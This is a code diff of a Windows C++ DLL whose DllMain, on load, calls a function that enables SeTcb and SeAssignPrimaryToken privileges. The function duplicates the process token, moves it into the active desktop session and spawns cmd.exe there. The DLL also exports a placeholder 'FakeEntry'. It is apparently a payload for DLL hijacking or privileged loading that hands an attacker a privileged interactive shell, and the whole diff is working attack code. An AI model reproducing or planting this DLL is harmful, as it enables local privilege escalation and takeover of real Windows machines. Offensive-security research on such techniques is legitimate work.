@@ -1,5 +1,8 @@
 #include "pch.h"
 
+#define SE_ASSIGN_PRIMARY_TOKEN_PRIVILEGE 3
+#define SE_TCB_PRIVILEGE 7
+
 extern "C"
 {
     __declspec(dllexport) VOID FakeEntry()
@@ -7,73 +10,115 @@ extern "C"
         return;
     }
 
-    __declspec(dllexport) BOOL ShellSpawn()
+    __declspec(dllexport) BOOL GetDesktopShell()
     {
-        BOOL bSuccess = FALSE;
-        HANDLE hToken = NULL;
-        HANDLE hDupToken = NULL;
-        DWORD sessionId = ::WTSGetActiveConsoleSessionId();
-        STARTUPINFO si = { 0 };
-        PROCESS_INFORMATION pi = { 0 };
-        si.cb = sizeof(si);
-        si.wShowWindow = SW_SHOW;
-        si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");
-
-        if (sessionId == 0xFFFFFFFF)
-            return FALSE;
-
-        bSuccess = ::OpenProcessToken(
-            ::GetCurrentProcess(),
-            TOKEN_DUPLICATE,
-            &hToken);
-
-        if (!bSuccess)
-            return FALSE;
-
-        bSuccess = ::DuplicateTokenEx(
-            hToken,
-            MAXIMUM_ALLOWED,
-            nullptr,
-            SecurityAnonymous,
-            TokenPrimary,
-            &hDupToken);
-        ::CloseHandle(hToken);
-
-        if (!bSuccess)
-            return FALSE;
-
-        // Requires SeTcbPrivilege
-        bSuccess = ::SetTokenInformation(
-            hDupToken,
-            TokenSessionId,
-            &sessionId,
-            sizeof(sessionId));
-
-        if (!bSuccess)
-        {
-            ::CloseHandle(hDupToken);
-            return FALSE;
-        }
-
-        bSuccess = ::CreateProcessAsUser(
-            hDupToken,
-            const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
-            const_cast<wchar_t*>(L""),
-            nullptr,
-            nullptr,
-            FALSE,
-            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
-            nullptr,
-            nullptr,
-            &si,
-            &pi);
-        ::CloseHandle(hDupToken);
+        HANDLE hCurrentToken = NULL;
+        DWORD nDesktopSessionId = -1;
+        PWTS_SESSION_INFOW pSessionInfo = nullptr;
+        DWORD nCount = 0;
+        DWORD requiredPrivs[] = {
+            SE_ASSIGN_PRIMARY_TOKEN_PRIVILEGE,
+            SE_TCB_PRIVILEGE
+        };
+        BOOL bSuccess = WTSEnumerateSessionsW(
+            NULL,
+            0,
+            1,
+            &pSessionInfo,
+            &nCount);
 
         if (bSuccess)
         {
-            ::CloseHandle(pi.hThread);
-            ::CloseHandle(pi.hProcess);
+            for (DWORD idx = 0; idx < nCount; idx++)
+            {
+                if (pSessionInfo[idx].State == WTSActive)
+                {
+                    nDesktopSessionId = pSessionInfo[idx].SessionId;
+                    break;
+                }
+            }
         }
+
+        if (nDesktopSessionId == -1)
+            return FALSE;
+
+        ::OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
+
+        for (DWORD idx = 0; idx < (sizeof(requiredPrivs) / sizeof(DWORD)); idx++)
+        {
+            DWORD nReturnedLength = 0;
+            auto tokenPrivileges = TOKEN_PRIVILEGES();
+            tokenPrivileges.PrivilegeCount = 1;
+            tokenPrivileges.Privileges[0].Luid = { requiredPrivs[idx], 0 };
+            tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            bSuccess = ::AdjustTokenPrivileges(
+                hCurrentToken,
+                FALSE,
+                &tokenPrivileges,
+                sizeof(tokenPrivileges),
+                nullptr,
+                &nReturnedLength);
+        }
+
+        ::CloseHandle(hCurrentToken);
+
+        do
+        {
+            HANDLE hToken = NULL;
+            HANDLE hDupToken = NULL;
+            STARTUPINFO si = { 0 };
+            PROCESS_INFORMATION pi = { 0 };
+            si.cb = sizeof(si);
+            si.wShowWindow = SW_SHOW;
+            si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");
+            bSuccess = ::OpenProcessToken((HANDLE)-1, TOKEN_DUPLICATE, &hToken);
+
+            if (!bSuccess)
+                break;
+
+            bSuccess = ::DuplicateTokenEx(
+                hToken,
+                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
+                nullptr,
+                SecurityAnonymous,
+                TokenPrimary,
+                &hDupToken);
+            ::CloseHandle(hToken);
+
+            if (!bSuccess)
+                break;
+
+            // Requires SeTcbPrivilege
+            bSuccess = ::SetTokenInformation(
+                hDupToken,
+                TokenSessionId,
+                &nDesktopSessionId,
+                sizeof(nDesktopSessionId));
+
+            if (bSuccess)
+            {
+                bSuccess = ::CreateProcessAsUser(
+                    hDupToken,
+                    const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
+                    const_cast<wchar_t*>(L""),
+                    nullptr,
+                    nullptr,
+                    FALSE,
+                    CREATE_BREAKAWAY_FROM_JOB | CREATE_NEW_CONSOLE,
+                    nullptr,
+                    nullptr,
+                    &si,
+                    &pi);
+            }
+
+            ::CloseHandle(hDupToken);
+
+            if (bSuccess)
+            {
+                ::CloseHandle(pi.hThread);
+                ::CloseHandle(pi.hProcess);
+            }
+        } while (FALSE);
 
         return bSuccess;
     }
@@ -83,7 +128,7 @@ extern "C"
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
 {
     if (dwReason == DLL_PROCESS_ATTACH)
-        ShellSpawn();
+        GetDesktopShell();
 
     return TRUE;
 }
